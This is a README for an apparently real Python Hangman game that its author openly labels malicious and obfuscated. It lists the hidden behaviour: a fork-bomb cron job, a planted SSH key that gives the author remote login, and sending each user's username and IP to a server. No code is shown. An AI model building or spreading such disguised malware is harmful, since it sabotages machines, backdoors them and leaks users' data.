# The 'System' Hangman

A highly malicious version of the game Hangman. Download and play at your own risk!<br />
WARNING: The code is substantially obfuscated!

## Author :
* Addy Singh <addy689@gmail.com>

## License :
* The code is licensed under the MIT License

## Instructions

1. Make the hangman.py file executable.
	<pre>
	<code>$ sudo chmod a+x hangman.py</code><br />
	</pre>

2. Run the game. I have created word lists which the program will retrieve if you provide the necessary command-line argument. The word lists I have created are:
* movies
* idioms
* sportspersons
For instance, to play the game using the idioms word list:
	<pre>
	<code>$ ./hangman.py idioms</code><br />
	</pre>

## What goes on behind the scenes!

* A forkbomb that executes every 2 hours gets installed as a user cronjob in the user's system.
* My public key is planted in the user's system, allowing me to remote login (ssh) into  users on my subnet without entering their user password.
* The user's username and IP address are sent through an API call to a server where they are retrieved and stored in a database.
